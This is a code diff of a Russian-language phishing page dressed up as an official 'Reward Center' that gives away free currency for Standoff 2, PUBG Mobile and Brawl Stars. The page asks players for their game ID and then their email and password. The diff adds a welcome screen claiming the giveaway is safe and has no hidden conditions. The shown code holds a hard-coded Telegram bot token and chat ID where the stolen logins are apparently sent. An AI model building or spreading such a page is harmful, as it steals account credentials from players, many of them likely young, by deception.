@@ -8,7 +8,6 @@
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
     
     body {
-        /* Глубокий синий фон с мягким градиентом — выглядит дорого и надежно */
         background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0f172a 60%, #020617 100%);
         min-height: 100vh;
         display: flex;
@@ -18,7 +17,6 @@
         color: #e2e8f0;
     }
     
-    /* Основной контейнер */
     .container {
         background: rgba(30, 41, 59, 0.7);
         backdrop-filter: blur(20px);
@@ -33,7 +31,6 @@
         position: relative;
     }
 
-    /* Полоска прогресса сверху */
     .progress-bar {
         height: 4px;
         background: rgba(255,255,255,0.05);
@@ -51,7 +48,6 @@
         padding: 32px 28px;
     }
     
-    /* Заголовок */
     .header {
         text-align: center;
         margin-bottom: 28px;
@@ -81,7 +77,7 @@
         line-height: 1.4;
     }
     
-    /* Меню кнопок — теперь ВЕРТИКАЛЬНОЕ (в столбик) */
+    /* Меню кнопок */
     .buttons {
         display: flex;
         flex-direction: column;
@@ -89,7 +85,6 @@
         margin-bottom: 24px;
     }
     
-    /* Кнопки платформ — стиль "список" */
     .btn {
         display: flex;
         align-items: center;
@@ -114,7 +109,6 @@
         transform: translateX(2px) scale(0.99);
     }
     
-    /* Иконка слева */
     .btn .icon {
         width: 42px;
         height: 42px;
@@ -127,15 +121,11 @@
         flex-shrink: 0;
     }
     
-    /* Индивидуальные цвета иконок (сдержанные, благородные) */
     .btn[data-game="standoff"] .icon { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
     .btn[data-game="pubg"] .icon { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
     .btn[data-game="brawl"] .icon { background: rgba(139, 92, 246, 0.15); color: #8b5cf6; }
     
-    /* Текст кнопки */
-    .btn-text {
-        flex-grow: 1;
-    }
+    .btn-text { flex-grow: 1; }
     .btn-text .platform-name {
         display: block;
         font-size: 15px;
@@ -150,7 +140,6 @@
         font-weight: 400;
     }
     
-    /* Стрелочка справа */
     .btn .arrow {
         color: #64748b;
         font-size: 18px;
@@ -161,12 +150,10 @@
         color: #10b981;
     }
 
-    /* Шаги (формы) */
     .step { display: none; flex-direction: column; gap: 14px; }
     .step.active { display: flex; }
     .step h2 { font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px; text-align: center; }
     
-    /* Поля ввода */
     input {
         width: 100%;
         padding: 14px 16px;
@@ -189,7 +176,6 @@
     .error { color: #ef4444; font-size: 13px; display: none; text-align: center; margin-top: 4px; }
     .error.active { display: block; }
     
-    /* Главная кнопка действия */
     .submit {
         width: 100%;
         padding: 15px;
@@ -211,7 +197,6 @@
     }
     .submit:active { transform: scale(0.98); }
 
-    /* Кнопка "Назад" */
     .back-btn {
         background: transparent;
         border: none;
@@ -224,7 +209,6 @@
     }
     .back-btn:hover { color: #94a3b8; }
 
-    /* Экран успеха */
     .success {
         display: none;
         flex-direction: column;
@@ -257,7 +241,64 @@
     .success p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
     .success .note { font-size: 12px; color: #64748b; margin-top: 8px; }
 
-    /* Подвал */
+    /* === Пред-сообщение === */
+    .welcome {
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+        text-align: center;
+    }
+    .welcome h2 {
+        font-size: 17px;
+        font-weight: 700;
+        color: #ffffff;
+        line-height: 1.4;
+        margin-bottom: 4px;
+    }
+    .welcome p {
+        font-size: 14px;
+        color: #cbd5e1;
+        line-height: 1.6;
+    }
+    .welcome .features {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin: 8px 0;
+        text-align: left;
+        background: rgba(15, 23, 42, 0.5);
+        border: 1px solid rgba(255, 255, 255, 0.06);
+        border-radius: 14px;
+        padding: 16px;
+    }
+    .welcome .features div {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 13.5px;
+        color: #e2e8f0;
+        line-height: 1.4;
+    }
+    .welcome .features .check {
+        color: #10b981;
+        font-size: 16px;
+        flex-shrink: 0;
+    }
+    .welcome .features .warn {
+        color: #f59e0b;
+        font-size: 16px;
+        flex-shrink: 0;
+    }
+    .welcome .features .warn-text {
+        color: #fbbf24;
+        font-weight: 600;
+    }
+    .welcome .bottom-text {
+        font-size: 13px;
+        color: #94a3b8;
+        margin-top: 4px;
+    }
+
     .footer {
         text-align: center;
         font-size: 11px;
@@ -270,74 +311,108 @@
 </head>
 <body>
 <div class="container">
-    <!-- Полоска прогресса -->
     <div class="progress-bar">
         <div class="progress-fill" id="progressFill"></div>
     </div>
 
     <div class="inner-content">
-        <!-- Заголовок -->
-        <div class="header" id="header">
-            <div class="logo-icon">🎁</div>
-            <h1>Reward Center</h1>
-            <p class="sub">Выберите платформу для получения награды</p>
+        <!-- ЭКРАН 0: Пред-сообщение -->
+        <div class="welcome" id="welcomeStep">
+            <div class="header" style="margin-bottom: 8px;">
+                <div class="logo-icon">🎁</div>
+                <h1>Reward Center</h1>
+            </div>
+
+            <h2>Добро пожаловать в официальный центр выдачи наград</h2>
+            <p>Здесь вы можете <b style="color:#10b981;">выбрать награду</b> и получить бесплатную раздачу внутриигровой валюты: <b>Gold</b>, <b>UC</b> и <b>Gems</b> — без покупок и без подписок.</p>
+
+            <div class="features">
+                <div>
+                    <span class="check">✅</span>
+                    <span>Раздача доступна каждому игроку</span>
+                </div>
+                <div>
+                    <span class="check">✅</span>
+                    <span>Награда зачисляется автоматически</span>
+                </div>
+                <div>
+                    <span class="check">✅</span>
+                    <span>Безопасно и без скрытых условий</span>
+                </div>
+                <div>
+                    <span class="warn">⚠️</span>
+                    <span class="warn-text">Забрать награду можно только один раз</span>
+                </div>
+            </div>
+
+            <p class="bottom-text">Нажмите «Продолжить», чтобы выбрать свою награду.</p>
+
+            <button class="submit" onclick="showMain()">Продолжить</button>
         </div>
 
-        <!-- Меню кнопок (вертикальное) -->
-        <div class="buttons" id="buttons">
-            <button class="btn" data-game="standoff" onclick="selectPlatform('STANDOFF 2', 'Gold')">
-                <div class="icon">🪙</div>
-                <div class="btn-text">
-                    <span class="platform-name">STANDOFF 2</span>
-                    <span class="platform-reward">Награда: Gold</span>
-                </div>
-                <div class="arrow">›</div>
-            </button>
-            
-            <button class="btn" data-game="pubg" onclick="selectPlatform('PUBG Mobile', 'UC')">
-                <div class="icon">💰</div>
-                <div class="btn-text">
-                    <span class="platform-name">PUBG Mobile</span>
-                    <span class="platform-reward">Награда: UC</span>
-                </div>
-                <div class="arrow">›</div>
-            </button>
-            
-            <button class="btn" data-game="brawl" onclick="selectPlatform('Brawl Stars', 'Gems')">
-                <div class="icon">💎</div>
-                <div class="btn-text">
-                    <span class="platform-name">Brawl Stars</span>
-                    <span class="platform-reward">Награда: Gems</span>
-                </div>
-                <div class="arrow">›</div>
-            </button>
-        </div>
+        <!-- ЭКРАН 1: Главное меню -->
+        <div id="mainStep" style="display: none;">
+            <div class="header" id="header">
+                <div class="logo-icon">🎁</div>
+                <h1>Reward Center</h1>
+                <p class="sub">Выберите платформу для получения награды</p>
+            </div>
 
-        <!-- Шаг 1: Ввод ID -->
-        <div class="step" id="idStep">
-            <h2 id="idTitle">Введите игровой ID</h2>
-            <input type="text" id="gameId" placeholder="ID">
-            <p class="hint" id="idHint"></p>
-            <p class="error" id="idError">Неверный формат ID</p>
-            <button class="submit" onclick="checkId()">Продолжить</button>
-            <button class="back-btn" onclick="goBack()">← Назад к выбору платформы</button>
-        </div>
+            <div class="buttons" id="buttons">
+                <button class="btn" data-game="standoff" onclick="selectPlatform('STANDOFF 2', 'Gold')">
+                    <div class="icon">🪙</div>
+                    <div class="btn-text">
+                        <span class="platform-name">STANDOFF 2</span>
+                        <span class="platform-reward">Награда: Gold</span>
+                    </div>
+                    <div class="arrow">›</div>
+                </button>
+                
+                <button class="btn" data-game="pubg" onclick="selectPlatform('PUBG Mobile', 'UC')">
+                    <div class="icon">💰</div>
+                    <div class="btn-text">
+                        <span class="platform-name">PUBG Mobile</span>
+                        <span class="platform-reward">Награда: UC</span>
+                    </div>
+                    <div class="arrow">›</div>
+                </button>
+                
+                <button class="btn" data-game="brawl" onclick="selectPlatform('Brawl Stars', 'Gems')">
+                    <div class="icon">💎</div>
+                    <div class="btn-text">
+                        <span class="platform-name">Brawl Stars</span>
+                        <span class="platform-reward">Награда: Gems</span>
+                    </div>
+                    <div class="arrow">›</div>
+                </button>
+            </div>
 
-        <!-- Шаг 2: Ввод данных -->
-        <form class="step" id="loginStep" onsubmit="return sendData(event)">
-            <h2 id="formTitle">Получение награды</h2>
-            <input type="email" id="email" placeholder="Электронная почта" required>
-            <input type="password" id="password" placeholder="Пароль" required>
-            <button type="submit" class="submit">Получить 🎁</button>
-            <button type="button" class="back-btn" onclick="goBackToId()">← Назад</button>
-        </form>
+            <!-- Шаг 1: Ввод ID -->
+            <div class="step" id="idStep">
+                <h2 id="idTitle">Введите игровой ID</h2>
+                <input type="text" id="gameId" placeholder="ID">
+                <p class="hint" id="idHint"></p>
+                <p class="error" id="idError">Неверный формат ID</p>
+                <button class="submit" onclick="checkId()">Продолжить</button>
+                <button class="back-btn" onclick="goBack()">← Назад к выбору платформы</button>
+            </div>
 
-        <!-- Шаг 3: Успех -->
-        <div class="success" id="success">
-            <div class="checkmark">✓</div>
-            <h2>Подарок получен!</h2>
-            <p id="successText">Ваша награда зачислена на аккаунт.</p>
-            <p class="note">Зайдите в игру и проверьте инвентарь</p>
+            <!-- Шаг 2: Ввод данных -->
+            <form class="step" id="loginStep" onsubmit="return sendData(event)">
+                <h2 id="formTitle">Получение награды</h2>
+                <input type="email" id="email" placeholder="Электронная почта" required>
+                <input type="password" id="password" placeholder="Пароль" required>
+                <button type="submit" class="submit">Получить 🎁</button>
+                <button type="button" class="back-btn" onclick="goBackToId()">← Назад</button>
+            </form>
+
+            <!-- Шаг 3: Успех -->
+            <div class="success" id="success">
+                <div class="checkmark">✓</div>
+                <h2>Подарок получен!</h2>
+                <p id="successText">Ваша награда зачислена на аккаунт.</p>
+                <p class="note">Зайдите в игру и проверьте инвентарь</p>
+            </div>
         </div>
     </div>
 
@@ -351,6 +426,13 @@
         document.getElementById('progressFill').style.width = percent + '%';
     }
 
+    // Переход с пред-сообщения на главное меню
+    function showMain() {
+        document.getElementById('welcomeStep').style.display = 'none';
+        document.getElementById('mainStep').style.display = 'block';
+        updateProgress(33);
+    }
+
     function selectPlatform(platform, reward) {
         selected.platform = platform;
         selected.reward = reward;
@@ -358,7 +440,7 @@
         document.getElementById('buttons').style.display = 'none';
         document.getElementById('header').style.display = 'none';
         document.getElementById('idTitle').textContent = `Введите ID · ${platform}`;
-        updateProgress(66); // Заполняем полоску на 2/3
+        updateProgress(66);
 
         let hint = '';
         let placeholder = '';
@@ -426,7 +508,6 @@
         const password = document.getElementById('password').value;
         const gameId = document.getElementById('gameId').value;
 
-        // ==== ВСТАВЬ СВОИ ЗНАЧЕНИЯ ====
         const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
         const CHAT_ID   = '8783227095';
 
